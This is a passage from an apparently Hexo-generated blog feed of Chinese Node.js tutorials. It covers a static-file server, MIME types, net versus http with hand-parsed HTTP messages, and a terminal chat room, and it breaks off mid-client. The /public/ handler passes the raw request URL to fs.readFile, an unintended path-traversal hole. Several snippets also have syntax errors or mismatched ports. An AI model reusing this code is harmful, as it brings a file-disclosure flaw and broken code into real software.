class="string">'/img/96102-106.jpg'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./data/static/img/96102-106.jpg'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'image/jpeg'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/js/main.js'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./data/static/js/main.js'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'application/x-javascript; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000.'</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>index.html 文档内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- src: ./data/static/index.html --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">  &lt;!-- http://127.0.0.1:3000/css/main.css --&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;css/a.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;首页&lt;/h1&gt;</span><br><span class="line">  &lt;!-- http://127.0.0.1:3000/img/96102-106.jpg --&gt;</span><br><span class="line">  &lt;img src=&quot;img/96102-106.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">  &lt;!-- http://127.0.0.1:3000/js/main.js --&gt;</span><br><span class="line">  &lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="解决静态资源的-mime-类型"><a href="#解决静态资源的-mime-类型" class="headerlink" title="解决静态资源的 mime 类型"></a>解决静态资源的 mime 类型</h2><ul><li>‘Content-Type’: mime.lookup(url);</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> mime = <span class="built_in">require</span>(<span class="string">'mime'</span>);</span><br><span class="line">http</span><br><span class="line">  .createServer()</span><br><span class="line">  .on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="comment">// /  index.html</span></span><br><span class="line">    <span class="comment">// /add add.html</span></span><br><span class="line">    <span class="comment">// /404 404.html</span></span><br><span class="line">    <span class="comment">// http://127.0.0.1:3000/public/css/main.css</span></span><br><span class="line">    <span class="comment">// http://127.0.0.1:3000/public/js/main.js</span></span><br><span class="line">    <span class="keyword">const</span> url = req.url</span><br><span class="line">    <span class="keyword">if</span> (url === <span class="string">'/'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./views/index.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.startsWith(<span class="string">'/public/'</span>)) &#123;</span><br><span class="line">      <span class="comment">// /public/css/main.css</span></span><br><span class="line">      <span class="comment">// /public/js/main.js</span></span><br><span class="line">      fs.readFile(<span class="string">`.<span class="subst">$&#123;url&#125;</span>`</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Content-Type ？</span></span><br><span class="line">        <span class="comment">// 无论是任何资源，都最好要有 Content-Type</span></span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: mime.lookup(url);</span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url === <span class="string">'/add'</span>) &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./views/add.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fs.readFile(<span class="string">'./views/404.html'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server is running at port 3000.'</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><ul><li>./views/index.html</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"public/css/main.css"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"public/css/a.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"public/js/main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="http-和-net-的区别与联系"><a href="#http-和-net-的区别与联系" class="headerlink" title="http 和 net 的区别与联系"></a>http 和 net 的区别与联系</h2><p>解释浏览器和服务器的交互本质：</p><ul><li>本质上就是浏览器通过 Socket 和 服务器 Socket 进行通信</li><li>双方都通过 HTTP 协议进行交流</li><li>net 模块就是传输层的一个模块，只是为了纯粹的收发数据</li><li>http 模块构建与 net 模块之上，只不过对于收发的数据会进行解析和包装</li><li>所有的BS模型都是使用的 HTTP 协议进行数据的解析和包装</li></ul><p>一下代码仅仅用来说明 net 和 HTTP 之间的联系与区别，没有实际应用意义。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line">net</span><br><span class="line">  .createServer();</span><br><span class="line">  .on(<span class="string">'connection'</span>, socket =&gt; &#123;</span><br><span class="line">    socket.on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">      <span class="comment">// console.log(data.toString())</span></span><br><span class="line">      <span class="comment">// 自己动手解析请求报文</span></span><br><span class="line">      <span class="comment">// 1. 按照空行将请求体和请求报文分割</span></span><br><span class="line">      <span class="comment">// 2. 按照换行将请求头分割</span></span><br><span class="line">      <span class="comment">//    数组中第 0 项就是请求首行</span></span><br><span class="line">      <span class="comment">//    其它所有项都是请求首部字段</span></span><br><span class="line">      <span class="built_in">console</span>.log(socket.remoteAddress, socket.remotePort);</span><br><span class="line">      data = data.toString();</span><br><span class="line">      <span class="keyword">const</span> requestContext = data.split(<span class="string">'\r\n\r\n'</span>);</span><br><span class="line">      <span class="keyword">const</span> requestHead = requestContext[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">const</span> requestBody = requestContext[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">const</span> req = &#123;&#125;;</span><br><span class="line">      <span class="comment">// url method httpVersion</span></span><br><span class="line">      <span class="comment">// headers</span></span><br><span class="line">      <span class="comment">// &#123; key: value, key:value &#125; 给在给 req 对象的 headers</span></span><br><span class="line">      <span class="keyword">const</span> requestHeadFirst = requestHead.split(<span class="string">'\r\n'</span>)[<span class="number">0</span>].split(<span class="string">' '</span>);</span><br><span class="line">      req.method = requestHeadFirst[<span class="number">0</span>];</span><br><span class="line">      req.url = requestHeadFirst[<span class="number">1</span>];</span><br><span class="line">      req.httpVersion = requestHeadFirst[<span class="number">2</span>];</span><br><span class="line">      req.headers = &#123;&#125;;</span><br><span class="line">      <span class="keyword">const</span> requestHeadFileds = requestHead.split(<span class="string">'\r\n'</span>).slice(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> requestHeadFileds) &#123;</span><br><span class="line">        <span class="keyword">const</span> tmp = item.split(<span class="string">': '</span>);</span><br><span class="line">        req.headers[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// net 模块中发送数据只是纯粹的发送你传入的字符串，有一行空白行。</span></span><br><span class="line">      socket.write(<span class="string">`</span></span><br><span class="line"><span class="string">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Server: Itcast</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">foo: bar</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=utf-8</span></span><br><span class="line"><span class="string">&lt;h1&gt;hello world&lt;/h1&gt;`</span>);</span><br><span class="line">      socket.end();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server is running at port 3000.'</span>)</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>当在浏览器地址栏输入了一个地址：<a href="http://127.0.0.1:3000/" target="_blank" rel="noopener">http://127.0.0.1:3000/</a></p><p>浏览器按照 HTTP 协议将你输入的地址包装成 HTTP 请求报文，内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">53.0</span><span class="number">.2785</span><span class="number">.116</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, sdch</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8</span></span><br></pre></td></tr></table></figure><p>请求报文格式如下：</p><ul><li>请求头<ul><li>请求首行<ul><li>请求方法 请求路径 HTTP协议版本</li></ul></li><li>请求首部字段<ul><li>首都字段中放一些额外的附加信息</li><li>例如 User-Agent 表示告诉服务器我这个客户端是什么<ul><li>这里为什么有各种浏览器的标识</li><li>原因在早期的网页有各种各样兼容性问题</li><li>这个字段还可以用来统计浏览器的使用量占比情况</li></ul></li><li>Accept<ul><li>早期的 HTTP 0.9 中，只能收发普通字符数据 不支持图片等富文本信息</li><li>历史原因，现代的服务器和客户端浏览器已经不需要这个东西</li></ul></li></ul></li></ul></li><li>空行</li><li>请求体<ul><li>如果是 post 请求才有请求体</li><li>如果有请求体，则请求体是在请求头的回车换行之后</li><li>如果没有，也会有一个空行存在</li></ul></li></ul><p>响应报文：</p><ul><li>响应头<ul><li>响应首行<ul><li>HTTP协议版本 状态码 状态短语</li></ul></li><li>响应首部字段</li></ul></li><li>空行</li><li>响应体<ul><li>所有的响应数据都在响应头之后的空行之后</li></ul></li></ul><h2 id="net-和-http-模块的关系："><a href="#net-和-http-模块的关系：" class="headerlink" title="net 和 http 模块的关系："></a>net 和 http 模块的关系：</h2><ul><li>http 模块是构建与 net 模块之上的</li><li>http 中的收发数据还是通过 net 模块中的 Socket 收发数据的</li><li>http 会将收发的数据按照 HTTP 协议自动帮你解析和包装<ul><li>例如 http 模块自动将请求报文解析出来，然后挂载给了 req 请求对象</li><li>你可以通过 req 请求对象去拿到你想要的信息</li></ul></li><li>为什么既有 net 又有 http 呢？<ul><li>http 只是一个基于 net 之上的一个模块，该模块遵循的 http 协议</li><li>会对收发的数据进行 协议格式解析和包装</li><li>HTTP 协议只是适用于B/S模型</li></ul></li><li>有的业务功能使用的是别的协议<ul><li>例如 一些智能终端，就用的是别的协议，而不是 HTTP</li><li>但是他们都是基于最基本的 Socket 网络编程模型而构建的</li></ul></li></ul><h2 id="浏览器的本质"><a href="#浏览器的本质" class="headerlink" title="浏览器的本质"></a>浏览器的本质</h2><ul><li>Socket 客户端<ul><li>收发数据</li></ul></li><li>渲染 HTML、CSS</li><li>解析和执行 JavaScript 代码</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议&lt;/p&gt;
&lt;p&gt;接收请求&lt;br&gt;处理请求&lt;br&gt;发送响应&lt;br&gt;net 为什么不能处理浏览器的响应呢？&lt;/p&gt;
&lt;p&gt;http 模块和 net 模块之间的区别&lt;/p&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>Node-网络编程-终端聊天室</title>
    <link href="http://yoursite.com/2017/01/01/Node-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E7%BB%88%E7%AB%AF%E8%81%8A%E5%A4%A9%E5%AE%A4/"/>
    <id>http://yoursite.com/2017/01/01/Node-网络编程-终端聊天室/</id>
    <published>2016-12-31T16:00:00.000Z</published>
    <updated>2018-06-06T05:19:50.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><ul><li>应用层<ul><li>http 协议</li><li>在浏览器输入一个地址，浏览器按照 http 协议将输入的地址包装成 http 报文</li><li>和数据传输没有任何关系</li><li>只负责数据包装</li><li>包装目的就是为了区分不同的行为</li></ul></li><li>传输层<ul><li>将应用层包装好的数据，通过传输层进行传输</li><li>TCP: 电话机<ul><li>端到端通信协议，必须知道对方的 ip 地址和端口号</li><li>TCP/IP 对数据传输有一定的完整性的保障<ul><li>一旦传输过程发生数据的完整性丢失，则全部丢掉重传</li></ul></li><li>三次握手连接<ul><li>双方通信必须先建立连接</li><li>确保双方都能收到对方的消息</li><li>首先呢，有两个概念<ul><li>客户端 发送一个请求 –&gt; 再回一个 这就是三次握手连接</li><li>服务器 回送一个消息</li></ul></li><li>建立三次握手连接之后双方就可以进行有保证的数据通信了</li></ul></li><li>用于 web 服务器 和 客户端浏览器 传输数据</li><li>数据安全性，对数据完整性有要求的使用 TCP/IP 协议</li></ul></li><li>UDP: 收音机 广播<ul><li>发送一条数据，谁收到我不关心</li><li>例如游戏、在线听歌、看电影 都是使用 UDP 协议</li><li>对于数据的完整性没有保证</li></ul></li></ul></li><li>网络层<ul><li>路由定位</li><li>IP 寻址 和 路由定位</li></ul></li><li>链路层<ul><li>“链接层”的功能，它在 “实体层” 的上方，确定了 0 和 1 的分组方式</li><li>对要传输的数据，把 0 和 1 进行分组，分成多个数据块进行传输</li></ul></li><li>实体层<ul><li>光缆、电缆、双绞线、无线电液</li><li>高电频、低电频</li></ul></li></ul><a id="more"></a><h2 id="在终端模拟聊天室"><a href="#在终端模拟聊天室" class="headerlink" title="在终端模拟聊天室"></a>在终端模拟聊天室</h2><h3 id="服务端模拟"><a href="#服务端模拟" class="headerlink" title="服务端模拟"></a>服务端模拟</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">const</span> server = net.createServer();</span><br><span class="line"><span class="comment">// 用户昵称: socket对象</span></span><br><span class="line"><span class="comment">// 用户昵称: socket对象</span></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">const</span> users = &#123;&#125;;</span><br><span class="line">server.on(<span class="string">'connection'</span>, socket =&gt; &#123;</span><br><span class="line">  <span class="comment">// 当收到客户端的注册消息的时候，处理注册请求</span></span><br><span class="line">  <span class="comment">// 可能昵称被占用了，你就要告诉用户被占用了</span></span><br><span class="line">  <span class="comment">// 如果没有被占用，则将昵称保存起来，告诉用户登陆聊天室成功</span></span><br><span class="line">  <span class="comment">// 叶良辰</span></span><br><span class="line">  <span class="comment">// \list</span></span><br><span class="line">  <span class="comment">// 我有一百种方法让你待不下去</span></span><br><span class="line">  <span class="comment">// 赵日天: 你等着</span></span><br><span class="line">  socket.json = <span class="function"><span class="params">obj</span> =&gt;</span> &#123;</span><br><span class="line">    socket.write(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">  &#125;</span><br><span class="line">  socket.on(<span class="string">'data'</span>, data =&gt; &#123;</span><br><span class="line">    data = data.toString().trim();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      data = <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">      <span class="keyword">switch</span> (data.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'signup'</span>:</span><br><span class="line">          <span class="comment">// 如果昵称已存在，则告诉用户昵称已存在</span></span><br><span class="line">          <span class="keyword">if</span> (users[data.message]) &#123;</span><br><span class="line">            <span class="keyword">return</span> socket.write(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">              type: <span class="string">'singup'</span>,</span><br><span class="line">              code: <span class="number">1001</span>,</span><br><span class="line">              message: <span class="string">'nickname already exists'</span></span><br><span class="line">            &#125;));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 将昵称保存到数据对象中</span></span><br><span class="line">          users[data.message] = socket;</span><br><span class="line">          <span class="comment">// 给客户端响应消息，告诉客户端登陆成功</span></span><br><span class="line">          socket.write(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">            type: <span class="string">'singup'</span>,</span><br><span class="line">            code: <span class="number">1000</span>,</span><br><span class="line">            nickname: data.message,</span><br><span class="line">            message: <span class="string">'success'</span>,</span><br><span class="line">          &#125;));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'broadcast'</span>:</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> nickname <span class="keyword">in</span> users) &#123;</span><br><span class="line">            users[nickname].json(&#123;</span><br><span class="line">              type: <span class="string">'broadcast'</span>,</span><br><span class="line">              <span class="keyword">from</span>: data.from,</span><br><span class="line">              message: data.message</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="number">10000</span>, <span class="string">'192.168.32.96'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'server is running at port 3000'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="客户端模拟"><a href="#客户端模拟" class="headerlink" title="客户端模拟"></a>客户端模拟</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">const</span> socket = net.createConnection(<span class="number">3000</span>, <span class="string">'192.168.32.96'</span>);</span><br><span class="line">socket.json = <span class="function"><span class="params">obj</span> =&gt;</span> &#123;</span><br><span class="line">  socket.write(<span class="built_in">JSON</span>.stringify(obj));</span><br><span 